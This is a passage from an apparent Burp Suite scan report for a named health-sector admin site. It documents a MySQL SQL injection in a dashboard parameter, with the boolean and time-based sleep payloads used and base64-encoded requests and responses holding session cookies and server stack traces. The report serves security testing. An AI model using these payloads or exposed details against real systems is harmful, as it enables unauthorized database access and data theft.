    <references><![CDATA[<ul><li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li><li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li><li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li><li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li><li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li><li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>typeId</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>'</b> was submitted in the typeId parameter, and a database error message was returned. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payloads <b>53394404 or 5221=05221</b> and <b>22548678 or 9144=9149</b> were each submitted in the typeId parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the typeId parameter. The application took <b>20319</b> milliseconds to respond to the request, compared with <b>401</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvRGFzaGJvYXJkIEhUVFAvMg0KSG9zdDogYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogKi8qDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTO3E9MC45LGVuO3E9MC44DQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTMxLjAuNjc3OC44NiBTYWZhcmkvNTM3LjM2DQpDb25uZWN0aW9uOiBjbG9zZQ0KQ2FjaGUtQ29udHJvbDogbWF4LWFnZT0wDQpDb29raWU6IFBIUFNFU1NJRD1waTJnbzhoMGg0cm1sbGwwcmltcHU4Z2Qybzsgc2NyZWVuV2lkdGg9ODAwOyBVc2VyVG90YWxFdmVudHM9aHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9Vc2VyVG90YWxFdmVudHMvP2FqYXg9dHJ1ZTsgc3RhZmZEYXNoYm9hcmRPcmdhbml6YXRpb249dW5kZWZpbmVkOyBzdGFmZkRhc2hib2FyZERhdGVSYW5nZT1Nb250aGx5OyBBV1NBTEI9ejZPNDBJRVJkOWdBa0xWK1U3MmZWZVllb0tKZHhwbm84cGQ1cjJTeDExUW9HWmtXVFRTN09ndG5kdkhzbzczNi8rTG5GUDBXYTExNWNaZHk0UDMvaTFXcldLQWJROWhNRkRwRkJYMW5idXBuNlljQ3Zka3N0MzdQRUJGSTsgQVdTQUxCQ09SUz16Nk80MElFUmQ5Z0FrTFYrVTcyZlZlWWVvS0pkeHBubzhwZDVyMlN4MTFRb0daa1dUVFM3T2d0bmR2SHNvNzM2LytMbkZQMFdhMTE1Y1pkeTRQMy9pMVdyV0tBYlE5aE1GRHBGQlgxbmJ1cG42WWNDdmRrc3QzN1BFQkZJDQpPcmlnaW46IGh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20NClgtUmVxdWVzdGVkLVdpdGg6IFhNTEh0dHBSZXF1ZXN0DQpSZWZlcmVyOiBodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tLw0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQ7IGNoYXJzZXQ9VVRGLTgNClNlYy1DSC1VQTogIi5Ob3QvQSlCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTMxIiwgIkNocm9taXVtIjt2PSIxMzEiDQpTZWMtQ0gtVUEtUGxhdGZvcm06IFdpbmRvd3MNClNlYy1DSC1VQS1Nb2JpbGU6ID8wDQpDb250ZW50LUxlbmd0aDogNjINCg0KdHlwZT1zdGFmZlVzZXImdHlwZUlkPTEnJnVzZXJJZHNMaXN0JTVCJTVEPTM5OSZkdXJhdGlvbj1Nb250aGx5]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzo1MTo1NCBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogMTAwNA0KU2V0LUNvb2tpZTogQVdTQUxCPTBNL3BEQjhKbjhGN0g5MXNwc2JmRWZTTUpYVnFCMW5QZFhBTEt3YS9RSEVuZ2FQWTdEalVtK2FTZTB4WnFWbXZyNmdtU2NPUjhpSnpJTVpSQjhSOHRQakp5dXJOSytVT2NaUFJ1VEc0OHViQnhvU3ZPSi9EUDdsTEI5TEc7IEV4cGlyZXM9U2F0LCAyMSBEZWMgMjAyNCAyMzo1MTo1MyBHTVQ7IFBhdGg9Lw0KU2V0LUNvb2tpZTogQVdTQUxCQ09SUz0wTS9wREI4Sm44RjdIOTFzcHNiZkVmU01KWFZxQjFuUGRYQUxLd2EvUUhFbmdhUFk3RGpVbSthU2UweFpxVm12cjZnbVNjT1I4aUp6SU1aUkI4Ujh0UGpKeXVyTksrVU9jWlBSdVRHNDh1YkJ4b1N2T0ovRFA3bExCOUxHOyBFeHBpcmVzPVNhdCwgMjEgRGVjIDIwMjQgMjM6NTE6NTMgR01UOyBQYXRoPS87IFNhbWVTaXRlPU5vbmU7IFNlY3VyZQ0KU2VydmVyOiBBcGFjaGUvMi40LjUyICgpIFBIUC84LjIuOQ0KWC1Qb3dlcmVkLUJ5OiBQSFAvOC4yLjkNCkV4cGlyZXM6IFRodSwgMTkgTm92IDE5ODEgMDg6NTI6MDAgR01UDQpDYWNoZS1Db250cm9sOiBuby1zdG9yZSwgbm8tY2FjaGUsIG11c3QtcmV2YWxpZGF0ZQ0KUHJhZ21hOiBuby1jYWNoZQ0KDQo8YnIgLz4KPGI+RmF0YWwgZXJyb3I8L2I+OiAgVW5jYXVnaHQgbXlzcWxpX3NxbF9leGNlcHRpb246IFlvdSBoYXZlIGFuIGVycm9yIGluIHlvdXIgU1FMIHN5bnRheDsgY2hlY2sgdGhlIG1hbnVhbCB0aGF0IGNvcnJlc3BvbmRzIHRvIHlvdXIgTXlTUUwgc2VydmVyIHZlcnNpb24gZm9yIHRoZSByaWdodCBzeW50YXggdG8gdXNlIG5lYXIgJycgYXQgbGluZSAxIGluIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvdXRpbC9kYlV0aWwucGhwOjI0ClN0YWNrIHRyYWNlOgojMCAvdmFyL3d3dy9odG1sL2luc2lnaHRzL2RhdGFiYXNlL3V0aWwvZGJVdGlsLnBocCgyNCk6IG15c3FsaS0mZ3Q7cXVlcnkoJ1NFTEVDVCB1c2VyLmlkIC4uLicpCiMxIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvbW9kZWxzL1VzZXIucGhwKDgzNik6IERiVXRpbDo6Z2V0U2VsZWN0UmVzdWx0KE9iamVjdChteXNxbGkpLCAnU0VMRUNUIHVzZXIuaWQgLi4uJykKIzIgL3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9hZG1pbi9oZWxwZXIvQmFzZUhlbHBlci5waHAoMjU0KTogVXNlcjo6Z2V0VXNlcklkc0J5VHlwZSgnMSZhbXA7IzAzOTsnLCBBcnJheSkKIzMgL3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9hZG1pbi9jb250cm9sbGVyL0Rhc2hib2FyZENvbnRyb2xsZXIucGhwKDM0Myk6IEJhc2VIZWxwZXItJmd0O2dldFVzZXJWU09yZ2FuaXphdGlvbkNvbXBsaWFuY2VUcmVuZERhdGEoJ2dldE1vbnRobHlBZ3JlZS4uLicsICdNb250aGx5JywgQXJyYXksIEFycmF5LCAnMSZhbXA7IzAzOTsnKQojNCAvdmFyL3d3dy9odG1sL2luc2lnaHRzL2FkbWluL2luZGV4LnBocCgxMTgpOiBEYXNoYm9hcmRDb250cm9sbGVyLSZndDtzaG93TGlzdCgnRGFzaGJvYXJkJywgdHJ1ZSwgdHJ1ZSwgZmFsc2UsIEFycmF5KQojNSB7bWFpbn0KICB0aHJvd24gaW4gPGI+L3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9kYXRhYmFzZS91dGlsL2RiVXRpbC5waHA8L2I+IG9uIGxpbmUgPGI+MjQ8L2I+PGJyIC8+Cg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvRGFzaGJvYXJkIEhUVFAvMg0KSG9zdDogYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogKi8qDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTO3E9MC45LGVuO3E9MC44DQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTMxLjAuNjc3OC44NiBTYWZhcmkvNTM3LjM2DQpDb25uZWN0aW9uOiBjbG9zZQ0KQ2FjaGUtQ29udHJvbDogbWF4LWFnZT0wDQpDb29raWU6IFBIUFNFU1NJRD1waTJnbzhoMGg0cm1sbGwwcmltcHU4Z2Qybzsgc2NyZWVuV2lkdGg9ODAwOyBVc2VyVG90YWxFdmVudHM9aHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9Vc2VyVG90YWxFdmVudHMvP2FqYXg9dHJ1ZTsgc3RhZmZEYXNoYm9hcmRPcmdhbml6YXRpb249dW5kZWZpbmVkOyBzdGFmZkRhc2hib2FyZERhdGVSYW5nZT1Nb250aGx5OyBBV1NBTEI9VzdHbWdKbkRvRTcxcjc4NnlOWXJKWmJLSGNvMXVFVXh1OUNkVnFXU2tYV3BsZ0k1N0IrbkhzUzJLSmhRZEFxT05reXQ3MjVDOC9pQUs0UlY5VHVCYnpsMzA3aTdIR1lrcCtwelNJcFZ1VmNIMm5uSCs5ZUdoNWwzWDJuRjsgQVdTQUxCQ09SUz1XN0dtZ0puRG9FNzFyNzg2eU5ZckpaYktIY28xdUVVeHU5Q2RWcVdTa1hXcGxnSTU3QituSHNTMktKaFFkQXFPTmt5dDcyNUM4L2lBSzRSVjlUdUJiemwzMDdpN0hHWWtwK3B6U0lwVnVWY0gybm5IKzllR2g1bDNYMm5GDQpPcmlnaW46IGh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20NClgtUmVxdWVzdGVkLVdpdGg6IFhNTEh0dHBSZXF1ZXN0DQpSZWZlcmVyOiBodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tLw0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQ7IGNoYXJzZXQ9VVRGLTgNClNlYy1DSC1VQTogIi5Ob3QvQSlCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTMxIiwgIkNocm9taXVtIjt2PSIxMzEiDQpTZWMtQ0gtVUEtUGxhdGZvcm06IFdpbmRvd3MNClNlYy1DSC1VQS1Nb2JpbGU6ID8wDQpDb250ZW50LUxlbmd0aDogNjINCg0KdHlwZT1zdGFmZlVzZXImdHlwZUlkPTE1MzM5NDQwNCUyMG9yJTIwNTIyMSUzZDA1MjIxJnVzZXJJZHNMaXN0JTVCJTVEPTM5OSZkdXJhdGlvbj1Nb250aGx5]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzo1MzoxNyBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogNDcwDQpTZXQtQ29va2llOiBBV1NBTEI9bFBzbXJSV0Fxa0pUU1BBSFh5REZmK2xpUDhQTzltNWp2T2NCZDVyTmNNbEs4Z3NjblRoQnBTNnNaNzdoVURXaHRWN3ZCZ1Z4QS9NRXRpWURQK0FrWGhnMExHNmRPUU85R3FEaUp5aDdRL0RXeU5ycWxMSGJHZ05qMk8rdjsgRXhwaXJlcz1TYXQsIDIxIERlYyAyMDI0IDIzOjUzOjE3IEdNVDsgUGF0aD0vDQpTZXQtQ29va2llOiBBV1NBTEJDT1JTPWxQc21yUldBcWtKVFNQQUhYeURGZitsaVA4UE85bTVqdk9jQmQ1ck5jTWxLOGdzY25UaEJwUzZzWjc3aFVEV2h0Vjd2QmdWeEEvTUV0aVlEUCtBa1hoZzBMRzZkT1FPOUdxRGlKeWg3US9EV3lOcnFsTEhiR2dOajJPK3Y7IEV4cGlyZXM9U2F0LCAyMSBEZWMgMjAyNCAyMzo1MzoxNyBHTVQ7IFBhdGg9LzsgU2FtZVNpdGU9Tm9uZTsgU2VjdXJlDQpTZXJ2ZXI6IEFwYWNoZS8yLjQuNTIgKCkgUEhQLzguMi45DQpYLVBvd2VyZWQtQnk6IFBIUC84LjIuOQ0KRXhwaXJlczogVGh1LCAxOSBOb3YgMTk4MSAwODo1MjowMCBHTVQNCkNhY2hlLUNvbnRyb2w6IG5vLXN0b3JlLCBuby1jYWNoZSwgbXVzdC1yZXZhbGlkYXRlDQpQcmFnbWE6IG5vLWNhY2hlDQoNCnsic3VjY2VzcyI6MSwiZGF0YSI6eyJjb21wbGlhbmNlVHJlbmQiOnsiY29tcGxpYW5jZSI6eyJPcmdhbml6YXRpb24iOlsiMC4wMCIsIjUuMzMiLCI2LjE1IiwiNjYuNjciLCI3NS4wMCIsIjk2Ljc3IiwiMi45MCIsIjcuOTQiLCI3OS41OSIsIjkwLjAzIiwiNzQuNDQiLDBdLCJEZWZhdWx0IjpbMCwiNC45NiIsIjYuMjAiLCI2Ni42NyIsIjEwMC4wMCIsIjEwMC4wMCIsIjEuNTMiLCI2LjE4IiwiNzkuNTciLCI2OS4yMyIsIjc1LjI4IiwwXX0sImRhdGUiOlsiSmFuIDIwMjQiLCJGZWIgMjAyNCIsIk1hciAyMDI0IiwiQXByIDIwMjQiLCJNYXkgMjAyNCIsIkp1biAyMDI0IiwiSnVsIDIwMjQiLCJBdWcgMjAyNCIsIlNlcCAyMDI0IiwiT2N0IDIwMjQiLCJOb3YgMjAyNCIsIkRlYyAyMDI0Il19LCJkaXNwZW5zZUV2ZW50c0J5RGVwYXJ0bWVudCI6W10sIm1pc3NlZE9wcG9ydHVuaXRpZXNWU1Nhbml0aXphdGlvbkNoYXJ0IjpbXX19]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvRGFzaGJvYXJkIEhUVFAvMg0KSG9zdDogYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogKi8qDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTO3E9MC45LGVuO3E9MC44DQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTMxLjAuNjc3OC44NiBTYWZhcmkvNTM3LjM2DQpDb25uZWN0aW9uOiBjbG9zZQ0KQ2FjaGUtQ29udHJvbDogbWF4LWFnZT0wDQpDb29raWU6IFBIUFNFU1NJRD1waTJnbzhoMGg0cm1sbGwwcmltcHU4Z2Qybzsgc2NyZWVuV2lkdGg9ODAwOyBVc2VyVG90YWxFdmVudHM9aHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9Vc2VyVG90YWxFdmVudHMvP2FqYXg9dHJ1ZTsgc3RhZmZEYXNoYm9hcmRPcmdhbml6YXRpb249dW5kZWZpbmVkOyBzdGFmZkRhc2hib2FyZERhdGVSYW5nZT1Nb250aGx5OyBBV1NBTEI9TnpiUXlXWWpzbXJiMEZDVkFZQ00rYXlybE0wZzBhUTlyTFkxZlcrcTdlaFlieHlML0Vsa3dQQ282elBWTWVpTlZ2ZWttTDBDM1RiNGpzN2JtZlo1T2F0ZWVmN0I4RElYSkVtOW5YOVhjN0VhdzN6TDdnZ2NoZGp3bDV2MDsgQVdTQUxCQ09SUz1OemJReVdZanNtcmIwRkNWQVlDTStheXJsTTBnMGFROXJMWTFmVytxN2VoWWJ4eUwvRWxrd1BDbzZ6UFZNZWlOVnZla21MMEMzVGI0anM3Ym1mWjVPYXRlZWY3QjhESVhKRW05blg5WGM3RWF3M3pMN2dnY2hkandsNXYwDQpPcmlnaW46IGh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20NClgtUmVxdWVzdGVkLVdpdGg6IFhNTEh0dHBSZXF1ZXN0DQpSZWZlcmVyOiBodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tLw0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQ7IGNoYXJzZXQ9VVRGLTgNClNlYy1DSC1VQTogIi5Ob3QvQSlCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTMxIiwgIkNocm9taXVtIjt2PSIxMzEiDQpTZWMtQ0gtVUEtUGxhdGZvcm06IFdpbmRvd3MNClNlYy1DSC1VQS1Nb2JpbGU6ID8wDQpDb250ZW50LUxlbmd0aDogNjINCg0KdHlwZT1zdGFmZlVzZXImdHlwZUlkPTEyMjU0ODY3OCUyMG9yJTIwOTE0NCUzZDkxNDkmdXNlcklkc0xpc3QlNUIlNUQ9Mzk5JmR1cmF0aW9uPU1vbnRobHk=]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzo1MzoxOCBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogNjE2DQpTZXQtQ29va2llOiBBV1NBTEI9MFVLRkp4dUlhQXY3R2VCVk5sTnpsSmQ4dUJQUXEra0owZVhDdms0dE9DSWxReDVldTlKQXNUMXBrYy95U0tQUTMvdERmOTBRUWhMbXV3ZUN6MDBTbVZFWUsxK1A0OFpYTUk3WHpwckJMYkdVUFlqSDBiamFWUzVBcFRoczsgRXhwaXJlcz1TYXQsIDIxIERlYyAyMDI0IDIzOjUzOjE4IEdNVDsgUGF0aD0vDQpTZXQtQ29va2llOiBBV1NBTEJDT1JTPTBVS0ZKeHVJYUF2N0dlQlZObE56bEpkOHVCUFFxK2tKMGVYQ3ZrNHRPQ0lsUXg1ZXU5SkFzVDFwa2MveVNLUFEzL3REZjkwUVFoTG11d2VDejAwU21WRVlLMStQNDhaWE1JN1h6cHJCTGJHVVBZakgwYmphVlM1QXBUaHM7IEV4cGlyZXM9U2F0LCAyMSBEZWMgMjAyNCAyMzo1MzoxOCBHTVQ7IFBhdGg9LzsgU2FtZVNpdGU9Tm9uZTsgU2VjdXJlDQpTZXJ2ZXI6IEFwYWNoZS8yLjQuNTIgKCkgUEhQLzguMi45DQpYLVBvd2VyZWQtQnk6IFBIUC84LjIuOQ0KRXhwaXJlczogVGh1LCAxOSBOb3YgMTk4MSAwODo1MjowMCBHTVQNCkNhY2hlLUNvbnRyb2w6IG5vLXN0b3JlLCBuby1jYWNoZSwgbXVzdC1yZXZhbGlkYXRlDQpQcmFnbWE6IG5vLWNhY2hlDQoNCjxiciAvPgo8Yj5XYXJuaW5nPC9iPjogIEF0dGVtcHQgdG8gcmVhZCBwcm9wZXJ0eSAibmFtZSIgb24gbnVsbCBpbiA8Yj4vdmFyL3d3dy9odG1sL2luc2lnaHRzL2FkbWluL2hlbHBlci9CYXNlSGVscGVyLnBocDwvYj4gb24gbGluZSA8Yj4yNzg8L2I+PGJyIC8+Cnsic3VjY2VzcyI6MSwiZGF0YSI6eyJjb21wbGlhbmNlVHJlbmQiOnsiY29tcGxpYW5jZSI6eyJPcmdhbml6YXRpb24iOlsiMC4wMCIsIjUuMzMiLCI2LjE1IiwiNjYuNjciLCI3NS4wMCIsIjk2Ljc3IiwiMi45MCIsIjcuOTQiLCI3OS41OSIsIjkwLjAzIiwiNzQuNDQiLDBdLCIiOlsiMC4wMCIsIjUuMzMiLCI2LjE1IiwiNjYuNjciLCI3NS4wMCIsIjk2Ljc3IiwiMi45MCIsIjcuOTQiLCI3OS41OSIsIjkwLjAzIiwiNzQuNDQiLDBdfSwiZGF0ZSI6WyJKYW4gMjAyNCIsIkZlYiAyMDI0IiwiTWFyIDIwMjQiLCJBcHIgMjAyNCIsIk1heSAyMDI0IiwiSnVuIDIwMjQiLCJKdWwgMjAyNCIsIkF1ZyAyMDI0IiwiU2VwIDIwMjQiLCJPY3QgMjAyNCIsIk5vdiAyMDI0IiwiRGVjIDIwMjQiXX0sImRpc3BlbnNlRXZlbnRzQnlEZXBhcnRtZW50IjpbXSwibWlzc2VkT3Bwb3J0dW5pdGllc1ZTU2FuaXRpemF0aW9uQ2hhcnQiOltdfX0=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvRGFzaGJvYXJkIEhUVFAvMg0KSG9zdDogYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogKi8qDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTO3E9MC45LGVuO3E9MC44DQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTMxLjAuNjc3OC44NiBTYWZhcmkvNTM3LjM2DQpDb25uZWN0aW9uOiBjbG9zZQ0KQ2FjaGUtQ29udHJvbDogbWF4LWFnZT0wDQpDb29raWU6IFBIUFNFU1NJRD1waTJnbzhoMGg0cm1sbGwwcmltcHU4Z2Qybzsgc2NyZWVuV2lkdGg9ODAwOyBVc2VyVG90YWxFdmVudHM9aHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9Vc2VyVG90YWxFdmVudHMvP2FqYXg9dHJ1ZTsgc3RhZmZEYXNoYm9hcmRPcmdhbml6YXRpb249dW5kZWZpbmVkOyBzdGFmZkRhc2hib2FyZERhdGVSYW5nZT1Nb250aGx5OyBBV1NBTEI9QktCNEdPcDBTYklNZ0x0eVVET3ZCZktiL29BaHFYMktjSURJV3ZtN1ZRdUV5RUw5dWJUYVhBRCtLeTZ0bEdFa2VwdXhqRzUyTzhXSWFhOWxwWFRYdG9PbG52UzJBQTk1b1cyQ292MXpBK3hVeFlaenBRRWU0aGFsVno3azsgQVdTQUxCQ09SUz1CS0I0R09wMFNiSU1nTHR5VURPdkJmS2Ivb0FocVgyS2NJRElXdm03VlF1RXlFTDl1YlRhWEFEK0t5NnRsR0VrZXB1eGpHNTJPOFdJYWE5bHBYVFh0b09sbnZTMkFBOTVvVzJDb3YxekEreFV4WVp6cFFFZTRoYWxWejdrDQpPcmlnaW46IGh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20NClgtUmVxdWVzdGVkLVdpdGg6IFhNTEh0dHBSZXF1ZXN0DQpSZWZlcmVyOiBodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tLw0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQ7IGNoYXJzZXQ9VVRGLTgNClNlYy1DSC1VQTogIi5Ob3QvQSlCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTMxIiwgIkNocm9taXVtIjt2PSIxMzEiDQpTZWMtQ0gtVUEtUGxhdGZvcm06IFdpbmRvd3MNClNlYy1DSC1VQS1Nb2JpbGU6ID8wDQpDb250ZW50LUxlbmd0aDogNjINCg0KdHlwZT1zdGFmZlVzZXImdHlwZUlkPShzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKSZ1c2VySWRzTGlzdCU1QiU1RD0zOTkmZHVyYXRpb249TW9udGhseQ==]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzo1MjoxNSBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogNDY2DQpTZXQtQ29va2llOiBBV1NBTEI9ZEFzczAvbVlQS3BhZVpEczZlUzZDNFNuQW9taW5JY0FMOU1iamFuVWZBbW54Mm1sSFBEN1ZnQmdXTGw2bDFuRUs0OHJoQWVFaDg3RnZTSDRMSFJoblBNWTJIS21GUG9zR0tsYm94a1Y3V05WRFlmTjFvVU5tOFNrSVlPSjsgRXhwaXJlcz1TYXQsIDIxIERlYyAyMDI0IDIzOjUxOjU0IEdNVDsgUGF0aD0vDQpTZXQtQ29va2llOiBBV1NBTEJDT1JTPWRBc3MwL21ZUEtwYWVaRHM2ZVM2QzRTbkFvbWluSWNBTDlNYmphblVmQW1ueDJtbEhQRDdWZ0JnV0xsNmwxbkVLNDhyaEFlRWg4N0Z2U0g0TEhSaG5QTVkySEttRlBvc0dLbGJveGtWN1dOVkRZZk4xb1VObThTa0lZT0o7IEV4cGlyZXM9U2F0LCAyMSBEZWMgMjAyNCAyMzo1MTo1NCBHTVQ7IFBhdGg9LzsgU2FtZVNpdGU9Tm9uZTsgU2VjdXJlDQpTZXJ2ZXI6IEFwYWNoZS8yLjQuNTIgKCkgUEhQLzguMi45DQpYLVBvd2VyZWQtQnk6IFBIUC84LjIuOQ0KRXhwaXJlczogVGh1LCAxOSBOb3YgMTk4MSAwODo1MjowMCBHTVQNCkNhY2hlLUNvbnRyb2w6IG5vLXN0b3JlLCBuby1jYWNoZSwgbXVzdC1yZXZhbGlkYXRlDQpQcmFnbWE6IG5vLWNhY2hlDQoNCnsic3VjY2VzcyI6MSwiZGF0YSI6eyJjb21wbGlhbmNlVHJlbmQiOnsiY29tcGxpYW5jZSI6eyJPcmdhbml6YXRpb24iOlsiMC4wMCIsIjUuMzMiLCI2LjE1IiwiNjYuNjciLCI3NS4wMCIsIjk2Ljc3IiwiMi45MCIsIjcuOTQiLCI3OS41OSIsIjkwLjAzIiwiNzQuNDQiLDBdLCIiOlsiMC4wMCIsIjUuMzMiLCI2LjE1IiwiNjYuNjciLCI3NS4wMCIsIjk2Ljc3IiwiMi45MCIsIjcuOTQiLCI3OS41OSIsIjkwLjAzIiwiNzQuNDQiLDBdfSwiZGF0ZSI6WyJKYW4gMjAyNCIsIkZlYiAyMDI0IiwiTWFyIDIwMjQiLCJBcHIgMjAyNCIsIk1heSAyMDI0IiwiSnVuIDIwMjQiLCJKdWwgMjAyNCIsIkF1ZyAyMDI0IiwiU2VwIDIwMjQiLCJPY3QgMjAyNCIsIk5vdiAyMDI0IiwiRGVjIDIwMjQiXX0sImRpc3BlbnNlRXZlbnRzQnlEZXBhcnRtZW50IjpbXSwibWlzc2VkT3Bwb3J0dW5pdGllc1ZTU2FuaXRpemF0aW9uQ2hhcnQiOltdfX0=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>3503727535088531456</serialNumber>
    <type>4197376</type>
    <name><![CDATA[Input returned in response (reflected)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/Dashboard]]></path>
    <location><![CDATA[/Dashboard [typeId parameter]]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
